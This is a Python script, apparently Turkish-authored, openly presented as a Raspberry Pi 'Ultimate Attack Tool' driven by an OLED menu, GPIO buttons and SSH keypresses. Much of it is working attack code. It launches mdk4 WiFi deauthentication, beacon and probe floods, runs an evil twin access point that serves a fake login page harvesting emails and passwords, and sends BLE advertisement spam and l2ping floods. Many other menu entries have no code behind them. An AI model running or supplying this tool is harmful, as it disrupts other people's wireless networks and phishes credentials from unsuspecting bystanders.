#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Raspberry Pi Ultimate Attack Tool
- OLED + Terminal SENKRONİZE
- SSH üzerinden sayı tuşları ile kontrol
- Fiziksel butonlar da çalışır
- Tüm attack'ler hazır
"""

import os
import sys
import time
import threading
import subprocess
import random
import json
import select
import termios
import tty
from datetime import datetime

# ============================================================
# GEREKLİ KÜTÜPHANELER
# ============================================================
try:
    import board
    import digitalio
    from PIL import Image, ImageDraw, ImageFont
    import adafruit_ssd1306
    OLED_AVAILABLE = True
except:
    OLED_AVAILABLE = False
    print("[!] OLED kütüphanesi yok")

try:
    import RPi.GPIO as GPIO
    GPIO_AVAILABLE = True
except:
    GPIO_AVAILABLE = False
    print("[!] GPIO kütüphanesi yok")

# ============================================================
# GPIO AYARLARI
# ============================================================
if GPIO_AVAILABLE:
    GPIO.setmode(GPIO.BCM)
    GPIO.setwarnings(False)

    BUTTONS = {
        'UP': 17,
        'DOWN': 27,
        'SELECT': 22,
        'BACK': 23
    }
    
    LED_RED = 24
    LED_GREEN = 5

    for pin in BUTTONS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_DOWN)
    
    GPIO.setup(LED_RED, GPIO.OUT)
    GPIO.setup(LED_GREEN, GPIO.OUT)
    GPIO.output(LED_RED, False)
    GPIO.output(LED_GREEN, False)

# ============================================================
# OLED AYARLARI
# ============================================================
if OLED_AVAILABLE:
    try:
        i2c = board.I2C()
        oled = adafruit_ssd1306.SSD1306_I2C(128, 64, i2c, addr=0x3C)
        oled.fill(0)
        oled.show()
        font = ImageFont.load_default()
        print("[+] OLED bağlandı")
    except Exception as e:
        print(f"[-] OLED hatası: {e}")
        OLED_AVAILABLE = False

# ============================================================
# MENÜ YAPISI
# ============================================================
MENU = {
    0: {"name": "🔥 WiFi Attacks", "icon": "📡", "color": "31", "items": [
        "Beacon Spam (MDK4)", "Deauth Attack", "Probe Request", 
        "Evil Twin AP", "PMKID Capture", "Handshake Capture", 
        "WPA Brute Force", "Auth DoS", "Channel Hopper"
    ]},
    1: {"name": "💙 Bluetooth/BLE", "icon": "🔵", "color": "34", "items": [
        "BLE Spam (Flipper)", "BlueSnarf", "BlueDump", 
        "BT Jammer", "HID Spoof", "AirTag Spam", 
        "BT Scanner", "BLE Beacon Spam"
    ]},
    2: {"name": "📡 NRF24L01", "icon": "📻", "color": "33", "items": [
        "Mouse Jacking", "Shockburst Spam", "Channel Jammer",
        "Pipe Scanner", "Sniffer Mode", "NRF Jammer"
    ]},
    3: {"name": "🌐 Network Tools", "icon": "🖧", "color": "36", "items": [
        "ARP Spoof", "DNS Spoof", "HTTP Phishing", 
        "Packet Sniffer", "Network Scanner", "MITM Proxy", 
        "SSL Strip", "MAC Changer"
    ]},
    4: {"name": "⚡ Rage Mode", "icon": "💢", "color": "35", "items": [
        "Everything ON", "Max Power", "Channel Hopper+",
        "Auto Target", "Turbo Mode"
    ]},
    5: {"name": "⚙️ Settings", "icon": "🔧", "color": "37", "items": [
        "WiFi Channel", "Power Options", "LED Control",
        "Save Config", "About", "Restart", "Shutdown"
    ]}
}

current_menu = 0
current_item = 0
submenu_level = 0
attack_running = False
current_attack = None
attack_thread = None

# Terminal kontrolü için
old_tty_settings = None
last_terminal_input = None

# ============================================================
# TERMINAL KONTROL (Sayı tuşları)
# ============================================================
def setup_terminal():
    """Terminal raw modunu ayarla"""
    global old_tty_settings
    old_tty_settings = termios.tcgetattr(sys.stdin)
    tty.setraw(sys.stdin.fileno())

def restore_terminal():
    """Terminal eski haline döndür"""
    if old_tty_settings:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty_settings)

def get_terminal_input():
    """Terminal'den tek tuş oku (non-blocking)"""
    global last_terminal_input
    if sys.stdin.isatty():
        dr, dw, de = select.select([sys.stdin], [], [], 0.05)
        if dr:
            key = sys.stdin.read(1)
            if key:
                last_terminal_input = key
                return key
    return None

def process_terminal_input(key):
    """Terminal'den gelen sayı tuşlarını işle"""
    global current_menu, current_item, submenu_level, attack_running
    
    if attack_running:
        if key == 'b' or key == 'B' or key == '0':
            stop_attack()
        return
    
    # Sayı tuşları
    if key == '2':  # Aşağı (DOWN)
        if submenu_level == 0:
            current_menu = (current_menu + 1) % len(MENU)
        else:
            current_item = (current_item + 1) % len(MENU[current_menu]["items"])
        update_displays()
    
    elif key == '8':  # Yukarı (UP)
        if submenu_level == 0:
            current_menu = (current_menu - 1) % len(MENU)
        else:
            current_item = (current_item - 1) % len(MENU[current_menu]["items"])
        update_displays()
    
    elif key == '6':  # Sağ (SELECT)
        if submenu_level == 0:
            submenu_level = 1
            current_item = 0
        else:
            attack_name = MENU[current_menu]["items"][current_item]
            start_attack(attack_name)
        update_displays()
    
    elif key == '4':  # Sol (BACK)
        if submenu_level == 1:
            submenu_level = 0
        update_displays()
    
    elif key == '5':  # Seç (ENTER)
        if submenu_level == 0:
            submenu_level = 1
            current_item = 0
        else:
            attack_name = MENU[current_menu]["items"][current_item]
            start_attack(attack_name)
        update_displays()

# ============================================================
# EKRAN ÇİZİM FONKSİYONLARI
# ============================================================
def draw_box(text_lines, title="ATTACK TOOL"):
    """Kutu içinde metin göster (hem OLED hem Terminal için)"""
    max_len = max(len(line) for line in text_lines) + 4
    width = max(max_len, 40)
    
    # Terminal çıktısı
    terminal_output = []
    terminal_output.append("┌" + "─" * (width - 2) + "┐")
    
    # Başlık
    title_line = f"│ {title.center(width-4)} │"
    terminal_output.append(title_line)
    terminal_output.append("├" + "─" * (width - 2) + "┤")
    
    # İçerik
    for line in text_lines:
        terminal_output.append(f"│ {line.ljust(width-4)} │")
    
    terminal_output.append("└" + "─" * (width - 2) + "┘")
    
    # Terminal'e yaz
    print("\033[2J\033[H")  # Ekranı temizle
    for line in terminal_output:
        print(f"\033[32m{line}\033[0m")  # Yeşil renk
    
    # OLED'e yaz (varsa)
    if OLED_AVAILABLE:
        image = Image.new("1", (128, 64))
        draw = ImageDraw.Draw(image)
        
        y = 0
        for i, line in enumerate(text_lines[:5]):  # OLED'e 5 satır sığar
            draw.text((0, y), line[:21], font=font, fill=255)
            y += 12
        
        oled.image(image)
        oled.show()

def draw_welcome():
    """Hoşgeldin ekranı"""
    lines = [
        "",
        "   ✅ SİSTEM HAZIR! ✅",
        "",
        "   Kontroller:",
        "   8 ↑    2 ↓",
        "   6 →    4 ←",
        "   5 SEÇ  0 DURDUR",
        "",
        "   Web UI:",
        "   http://192.168.4.1:5000",
        "",
        "   discord.gg/recte",
        ""
    ]
    draw_box(lines, "🔥 ATTACK TOOL 🔥")
    time.sleep(3)

def draw_main_menu():
    """Ana menüyü çiz"""
    lines = []
    lines.append("")
    lines.append("=== ANA MENU ===")
    lines.append("")
    
    for i, (key, val) in enumerate(MENU.items()):
        if i == current_menu:
            lines.append(f" ▶ {val['icon']} {val['name']}")
        else:
            lines.append(f"    {val['icon']} {val['name']}")
    
    if attack_running:
        lines.append("")
        lines.append("⚡ SALDIRI AKTIF ⚡")
    else:
        lines.append("")
        lines.append("📡 HAZIR")
    
    draw_box(lines, "🔥 ATTACK TOOL 🔥")

def draw_sub_menu():
    """Alt menüyü çiz"""
    items = MENU[current_menu]["items"]
    lines = []
    lines.append("")
    lines.append(f"=== {MENU[current_menu]['name']} ===")
    lines.append("")
    
    start_idx = max(0, current_item - 4)
    end_idx = min(len(items), start_idx + 8)
    
    for i in range(start_idx, end_idx):
        if i == current_item:
            lines.append(f" ▶ {items[i]}")
        else:
            lines.append(f"    {items[i]}")
    
    lines.append("")
    lines.append("0: GERI  5: SEC")
    
    draw_box(lines, "🔥 ATTACK TOOL 🔥")

def draw_attack_screen():
    """Saldırı ekranı"""
    lines = []
    lines.append("")
    lines.append("⚡ SALDIRI AKTIF ⚡")
    lines.append("")
    lines.append(f"   {current_attack}")
    lines.append("")
    lines.append("   [████████░░] 80%")
    lines.append("")
    lines.append("   0: DURDUR")
    lines.append("")
    lines.append(datetime.now().strftime("%H:%M:%S"))
    
    draw_box(lines, "🔥 ATTACK ACTIVE 🔥")

def update_displays():
    """Tüm ekranları güncelle"""
    if attack_running:
        draw_attack_screen()
    elif submenu_level == 0:
        draw_main_menu()
    else:
        draw_sub_menu()

def show_loading_animation():
    """Yükleme animasyonu"""
    frames = ["[■□□□□□□□]", "[■■□□□□□□]", "[■■■□□□□□]", "[■■■■□□□□]", 
              "[■■■■■□□□]", "[■■■■■■□□]", "[■■■■■■■□]", "[■■■■■■■■]"]
    for frame in frames:
        lines = ["", "   YUKLENIYOR...", "", f"   {frame}", ""]
        draw_box(lines, "🔥 ATTACK TOOL 🔥")
        time.sleep(0.1)

# ============================================================
# SALDIRI FONKSİYONLARI
# ============================================================
def set_monitor_mode():
    os.system("sudo airmon-ng check kill 2>/dev/null")
    os.system("sudo ip link set wlan0 down 2>/dev/null")
    os.system("sudo iw dev wlan0 set type monitor 2>/dev/null")
    os.system("sudo ip link set wlan0 up 2>/dev/null")
    if GPIO_AVAILABLE:
        GPIO.output(LED_GREEN, True)

def beacon_spam():
    ssids = ["Free_WiFi", "Airport_Free", "Starbucks", "Hotel_Guest", "NSA"]
    with open("/tmp/ssids.txt", "w") as f:
        for ssid in ssids:
            f.write(ssid + "\n")
    return f"sudo mdk4 wlan0 b -f /tmp/ssids.txt -c 1 -s 1000"

def deauth_attack():
    return "sudo mdk4 wlan0 d -c 100"

def probe_spam():
    return "sudo mdk4 wlan0 p -c 50 -u -t 1"

def evil_twin():
    html = """<!DOCTYPE html>
<html><head><title>WiFi Login</title>
<style>body{background:#0a0a0a;color:#00ff00;}.box{width:300px;margin:100px auto;padding:20px;border:1px solid red;}</style>
</head><body><div class='box'><h2>WiFi Authentication</h2>
<form method='post' action='/login'>
<input type='text' name='user' placeholder='Email'><br>
<input type='password' name='pass' placeholder='Password'><br>
<button>Login</button>
</form></div></body></html>"""
    with open("/tmp/index.html", "w") as f:
        f.write(html)
    os.system("sudo ifconfig wlan0 192.168.4.1 netmask 255.255.255.0")
    os.system("sudo hostapd /tmp/hostapd.conf -B 2>/dev/null")
    os.system("sudo python3 -m http.server 80 --directory /tmp &")
    return True

def ble_spam():
    devices = ["AirPods Pro", "Galaxy Buds", "Xbox", "PS5", "Apple Watch", "Tesla"]
    def spam():
        while attack_running:
            for device in devices:
                data = bytes([0x02, 0x01, 0x06]) + bytes([len(device)+1, 0x09]) + device.encode()
                os.system(f"sudo hcitool cmd 0x08 0x0008 {len(data):02X} " + " ".join([f"{b:02X}" for b in data]))
                time.sleep(0.05)
    return spam

def bt_jammer():
    return "sudo l2ping -i hci0 -s 600 -f 00:00:00:00:00:00 &"

def channel_hopper():
    def hop():
        while attack_running:
            for ch in range(1, 14):
                os.system(f"sudo iwconfig wlan0 channel {ch}")
                time.sleep(0.2)
    return hop

def everything_on():
    def all_attacks():
        for func in [beacon_spam, deauth_attack, probe_spam]:
            os.system(func() + " &")
        while attack_running:
            time.sleep(1)
    return all_attacks

def restart_pi():
    os.system("sudo reboot")

def shutdown_pi():
    os.system("sudo poweroff")

# ============================================================
# SALDIRI KONTROL
# ============================================================
def start_attack(attack_name):
    global attack_running, current_attack, attack_thread
    
    if attack_running:
        stop_attack()
    
    current_attack = attack_name
    attack_running = True
    
    if GPIO_AVAILABLE:
        GPIO.output(LED_RED, True)
    
    update_displays()
    
    cmd = None
    attack_func = None
    
    # WiFi attacks
    if "Beacon" in attack_name:
        cmd = beacon_spam()
    elif "Deauth" in attack_name:
        cmd = deauth_attack()
    elif "Probe" in attack_name:
        cmd = probe_spam()
    elif "Evil" in attack_name:
        attack_func = evil_twin
    elif "Channel" in attack_name:
        attack_func = channel_hopper()
    
    # BLE attacks
    elif "BLE Spam" in attack_name:
        attack_func = ble_spam()
    elif "BT Jammer" in attack_name:
        cmd = bt_jammer()
    
    # Rage mode
    elif "Everything ON" in attack_name:
        attack_func = everything_on()
    
    # Settings
    elif "Restart" in attack_name:
        attack_func = restart_pi
    elif "Shutdown" in attack_name:
        attack_func = shutdown_pi
    
    def run():
        if attack_func:
            result = attack_func()
            if callable(result):
                result()
        elif cmd:
            os.system(cmd + " &")
    
    attack_thread = threading.Thread(target=run)
    attack_thread.start()

def stop_attack():
    global attack_running
    attack_running = False
    
    if GPIO_AVAILABLE:
        GPIO.output(LED_RED, False)
    
    os.system("sudo killall mdk4 aircrack-ng airodump-ng hostapd dnsmasq tcpdump arpspoof dnsspoof hcitool l2ping 2>/dev/null")
    
    update_displays()

# ============================================================
# BUTON DÖNGÜSÜ (Fiziksel butonlar)
# ============================================================
def button_loop():
    global current_menu, current_item, submenu_level, attack_running
    
    last_state = {name: False for name in BUTTONS}
    
    while True:
        if not GPIO_AVAILABLE:
            time.sleep(0.1)
            continue
        
        changed = False
        
        for name, pin in BUTTONS.items():
            state = GPIO.input(pin)
            if state and not last_state[name]:
                if not attack_running:
                    if name == 'UP':
                        if submenu_level == 0:
                            current_menu = (current_menu - 1) % len(MENU)
                        else:
                            current_item = (current_item - 1) % len(MENU[current_menu]["items"])
                        changed = True
                    
                    elif name == 'DOWN':
                        if submenu_level == 0:
                            current_menu = (current_menu + 1) % len(MENU)
                        else:
                            current_item = (current_item + 1) % len(MENU[current_menu]["items"])
                        changed = True
                    
                    elif name == 'SELECT':
                        if submenu_level == 0:
                            submenu_level = 1
                            current_item = 0
                        else:
                            attack_name = MENU[current_menu]["items"][current_item]
                            start_attack(attack_name)
                        changed = True
                    
                    elif name == 'BACK':
                        if submenu_level == 1:
                            submenu_level = 0
                        changed = True
                
                elif name == 'BACK' and attack_running:
                    stop_attack()
                    changed = True
            
            last_state[name] = state
        
        if changed:
            update_displays()
        
        time.sleep(0.05)

# ============================================================
# WIFI AP KURULUMU
# ============================================================
def setup_wifi_ap():
    """WiFi AP kurulumu - SSID: raspberry, Pass: w2"""
    print("[+] WiFi AP kuruluyor...")
    
    hostapd_conf = """interface=wlan0
driver=nl80211
ssid=raspberry
hw_mode=g
channel=6
wmm_enabled=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=w2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
    with open("/tmp/hostapd.conf", "w") as f:
        f.write(hostapd_conf)
    
    dnsmasq_conf = """interface=wlan0
dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,24h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
server=8.8.8.8
"""
    with open("/tmp/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)
    
    os.system("sudo ifconfig wlan0 192.168.4.1 netmask 255.255.255.0 up")
    os.system("sudo pkill hostapd 2>/dev/null")
    os.system("sudo pkill dnsmasq 2>/dev/null")
    time.sleep(1)
    os.system("sudo hostapd /tmp/hostapd.conf -B")
    os.system("sudo dnsmasq -C /tmp/dnsmasq.conf -d &")
    
    print("[+] WiFi AP: raspberry (şifre: w2)")
    print("[+] IP: 192.168.4.1")

# ============================================================
# TERMINAL KONTROL DÖNGÜSÜ
# ============================================================
def terminal_input_loop():
    """Terminal'den gelen tuşları dinle"""
    while True:
        key = get_terminal_input()
        if key:
            process_terminal_input(key)
        time.sleep(0.05)

# ============================================================
# ANA FONKSİYON
# ============================================================
def main():
    # Ekranı temizle
    os.system("clear")
    
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║     🔥 RPi ZERO 2 W - ULTIMATE ATTACK TOOL v3.0 🔥            ║
    ║                                                               ║
    ║  WiFi AP: raspberry (şifre: w2)                               ║
    ║  SSH: ssh pi@192.168.4.1 (şifre: raspberry)                  ║
    ║                                                               ║
    ║  Terminal Kontrolleri:                                       ║
    ║    8 = YUKARI    2 = AŞAĞI                                   ║
    ║    6 = SAĞ/SELECT    4 = SOL/BACK                            ║
    ║    5 = SEÇ        0 = DURDUR                                 ║
    ║                                                               ║
    ║  Discord: discord.gg/recte                                    ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    # WiFi AP başlat
    setup_wifi_ap()
    
    # Monitor mod
    try:
        set_monitor_mode()
        print("[+] Monitor mod aktif")
    except:
        pass
    
    # Terminal raw mod
    setup_terminal()
    
    # Yükleme animasyonu
    show_loading_animation()
    
    # Hoşgeldin ekranı
    draw_welcome()
    
    # Buton döngüsü thread
    if GPIO_AVAILABLE:
        button_thread = threading.Thread(target=button_loop)
        button_thread.daemon = True
        button_thread.start()
    
    # Terminal input thread
    terminal_thread = threading.Thread(target=terminal_input_loop)
    terminal_thread.daemon = True
    terminal_thread.start()
    
    # Ana menüyü göster
    update_displays()
    
    print("\n\033[32m[+] Sistem hazir! Terminal'den sayi tuslarini kullanabilirsiniz.\033[0m")
    print("\033[33m[+] Telefonundan 'raspberry' WiFi'ina baglan (sifre: w2)\033[0m")
    print("\033[33m[+] SSH: ssh pi@192.168.4.1\033[0m")
    print("\033[33m[+] Bu terminalde sayi tuslarina basarak menuyu kontrol edebilirsin!\033[0m\n")
    
    # Ana döngü
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[!] Kapatılıyor...")
        restore_terminal()
        stop_attack()
        if GPIO_AVAILABLE:
            GPIO.cleanup()
        if OLED_AVAILABLE:
            oled.fill(0)
            oled.show()
        sys.exit(0)

if __name__ == "__main__":
    main()
